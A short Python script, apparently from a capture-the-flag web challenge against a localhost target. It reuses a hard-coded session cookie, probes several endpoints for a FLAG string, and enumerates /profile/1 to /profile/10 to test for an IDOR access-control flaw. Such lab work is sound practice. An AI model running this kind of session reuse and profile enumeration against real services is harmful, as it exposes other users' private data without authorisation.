import requests
import re

base_url = "http://127.0.0.1"
session_cookie = "1COpdQzZxvmSuiNtAtD1eijj_1JQeeZkIZtddX9egps"
cookies = {'session': session_cookie}

print("Testing authenticated access with session:", session_cookie[:20] + "...")
print("-" * 60)

# Test main endpoints
endpoints = ['/', '/profile', '/dashboard', '/api/user', '/home']

for endpoint in endpoints:
    try:
        url = f"{base_url}{endpoint}"
        resp = requests.get(url, cookies=cookies, timeout=10)
        
        print(f"\n{endpoint}: Status {resp.status_code} | Size {len(resp.content)}B")
        
        # Check for flag
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"[FLAG FOUND] {flag.group(0)}")
            print(f"Full response:\n{resp.text}")
            break
            
        # Show response if successful
        if resp.status_code == 200:
            print(f"Response: {resp.text[:300]}")
            
    except Exception as e:
        print(f"{endpoint}: Error - {str(e)}")

print("\nTesting IDOR - accessing other user profiles...")
print("-" * 60)

for user_id in range(1, 11):
    try:
        url = f"{base_url}/profile/{user_id}"
        resp = requests.get(url, cookies=cookies, timeout=5)
        
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"\n[!] FLAG FOUND at /profile/{user_id}")
            print(f"[!] {flag.group(0)}")
            print(f"[!] Full response:\n{resp.text}")
            break
            
        if resp.status_code == 200 and len(resp.content) > 100:
            print(f"[+] /profile/{user_id} - accessible ({len(resp.content)}B)")
            
    except Exception as e:
        pass

print("\nTesting complete")
